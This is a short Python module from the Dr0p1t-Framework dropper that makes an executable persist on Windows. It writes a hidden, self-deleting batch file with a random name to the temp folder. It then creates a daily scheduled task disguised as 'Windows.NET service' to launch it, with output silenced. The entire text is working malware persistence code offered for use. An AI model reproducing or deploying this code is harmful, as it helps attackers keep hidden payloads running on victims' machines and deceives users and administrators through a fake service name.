#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to task scheduler
#Start

def F5536( path,exe,bat ):
	bat_file = open( path+"\\"+bat,"w" )
	bat_file.write("@echo off\n")
	bat_file.write( '"{}"'.format(path+"\\"+exe) )
	bat_file.write("\n"+'break>"%~f0" && DEL "%~f0"')
	bat_file.close()
	blahah = subprocess.Popen( "attrib +s +h " + bat +" >> NUL",shell=True,cwd=path)

def F5570(exe):
	path = get_output("echo %TEMP%")
	bat_name = get_output("echo %random%%random%").strip() + ".bat"
	bat_path = path + "\\" + bat_name
	F5536( path,exe,bat_name )

	if "Windows.NET service" not in get_output("schtasks /query"): # Will Start every day at the same time
		blah = subprocess.Popen( 'SCHTASKS /CREATE /SC daily /TN "Windows.NET service" /TR {} >> NUL'.format( bat_path ),
		shell=True)

F5570(File)
